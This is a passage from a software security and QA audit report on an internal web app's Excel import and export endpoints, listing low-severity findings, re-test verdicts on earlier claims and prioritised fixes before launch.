- Account master: audit row written only for `wantsReset` and `wantsRoleChange` paths. No audit for "I just created 50 brand-new salesman accounts via import" — no `action: CREATE entityType: User` per row. No audit for region/route create either.
- Customer master promote: NO audit log entries written at all.
- Export endpoint *does* write an audit (`action: 'IMPORT'` — same misuse called out in QA-059).

**Fix:** Per-batch summary audit row at minimum: `{ action: IMPORT, entityType: 'ImportBatch', entityId: batch.id, after: { kind, totalRows, cleanRows, promotedRows, quarantinedRows } }`. Per-row entries for high-impact mutations (user create, role change, route reassignment).

---

### F-20 — Low · Customer master upload accepts blank `cust_code` only as quarantine reason, not as auto-generated NMWC code

**File / line:** `services/imports.ts:415-424`, `:638-639`.
- The code imports `formatCustomerCode` ("helper to format counter-style code if NMWC code is missing in input") but never calls it. Rows with blank `cust_code` are quarantined. The PRD says NMWC issues a code on first save; the importer requires the user to know the code.
- This is intentional per current spec but is a Manager UX trap: their ERP source may not have an NMWC code yet (it's a NEW customer being onboarded via import).

**Fix:** When `cust_code` is blank but `cust_name` is present, auto-assign next sequential NMWC code via `formatCustomerCode`. Surface in the batch detail page "auto-assigned: NMWC-2026-000123."

---

### F-21 — Low · `/api/exports/customers` parses Zod filters BEFORE auth (re-emergence of QA-047)

**File / line:** `app/api/exports/customers/route.ts:19-33`.
- A logged-out attacker hits `GET /api/exports/customers?regionId=...&minCompleteness=999` — Zod parses the query string, throws `z.ZodError` with details about the invalid input ("minCompleteness must be ≤ 100"). This is caught nowhere — Next.js returns a 500. Information disclosure (validates the endpoint exists and what its schema is) before establishing auth.
- The remediation report did not list QA-047 as fixed, and indeed it's still wrong. Low because the leak is small.

**Fix:** Run `await auth()` first. Only Zod-parse on confirmed auth.

---

### F-22 — Low · `/api/exports/customers` 500-vs-403 status mapping uses string-match (re-emergence of QA-025/048)

**File / line:** `app/api/exports/customers/route.ts:46-48`.
- `(err as Error).message.includes('signed in') ? 401 : 500`. A SALESMAN's "Your role cannot export." message contains neither 'signed in' — returns 500 instead of 403.
- The remediation report claims QA-025 closed by "added test." Empirically the route still has the same string-match logic and no test for the 403 path.

**Fix:** `instanceof ForbiddenError` → 403; `instanceof ForbiddenError && message.includes('signed in')` → 401; everything else 500.

---

### F-23 — Low · `accept=".xlsx"` only — no MIME-type check on server, no magic-byte sniffing

**Files:** `app/(app)/import/forms.tsx:50` (client-side accept), `services/imports.ts:48` (server only checks size).
- `accept=".xlsx"` is a UI hint, easily bypassed. Server accepts any file under 5MB. exceljs throws on non-zip → user sees "Could not read .xlsx: end of central directory record signature not found."
- Polyglot files (xlsx + html, xlsx + svg) can pass `wb.xlsx.load` if the zip portion is valid — Excel ignores the extra; some downstream consumers do not.

**Fix:** Sniff first 4 bytes for the ZIP magic `50 4B 03 04`. Reject otherwise with a clear "not an xlsx" message.

---

## 2) Re-test of the original audit's claims

| Claim | Verdict | Evidence |
|---|---|---|
| QA-010 (passwords not rotated by default) | ✅ Confirmed correct | `services/imports.ts:236-260` — only rotates on `wantsReset` |
| QA-011 (no role escalation) | ❌ **NOT closed** | F-02 — three independent bypasses |
| QA-012 (file size cap) | ⚠️ Partially closed | F-06 — 5 MB compressed cap, no decompressed cap |
| QA-019 (per-row tx) | ✅ Confirmed correct in tx scope | F-03/F-07 — but failure handling negates the value |
| QA-021 (formula injection on export) | ✅ Confirmed correct | unit-tested at `tests/unit/excel.test.ts` |
| QA-029 (HTML strip parity on import) | ❌ Still open | F-05 — `stripHtml` not applied to importer |
| QA-034 (export row cap) | ❌ Still open | F-16 — punted in remediation, never fixed |
| QA-047 (filter parse before auth) | ❌ Still open | F-21 |
| QA-048/QA-025 (export 500-not-403) | ❌ Still open | F-22 |

---

## 3) Recommended block-list before pilot launch

If only three things were fixed in the next 24 hours, in priority:
1. **F-01** — fix the export scope-bypass. One-line change with bounded blast radius if missed (Manager exporting wrong region's data, irreversibly leaked once downloaded).
2. **F-02** — close the self-promotion guard properly (use user.id, block STEWARD-creates-MANAGER outright, block any role transition into MANAGER through import).
3. **F-03** — surface promote failures on the UI, mark failed rows REJECTED, and write the per-batch IMPORT audit row.

The rest are real, but the above three are the ones that will damage trust in the launch.

— Audit 03, 2026-05-09
